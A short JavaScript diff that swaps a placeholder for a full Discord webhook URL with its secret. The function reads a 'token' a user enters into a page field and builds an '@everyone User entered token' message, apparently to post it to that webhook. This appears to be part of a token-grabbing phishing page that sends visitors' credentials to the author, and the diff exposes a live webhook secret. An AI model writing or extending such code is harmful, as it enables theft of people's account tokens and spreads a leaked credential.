@@ -1,5 +1,5 @@
 function sendWebhookMessage(inputId) {
-  var webhookURL = 'your webhook';
+  var webhookURL = 'https://discord.com/api/webhooks/1405270190903525528/Ai7E2vejtdUMmkcdUQ3pm_iuHry28xzoJVWnqFrbhDsnL1GAn9Ozex8Oqw8wffYQczAP';
   var input = document.getElementById(inputId);
   var token = input.value;
   var message = "@everyone User entered token: " + token;
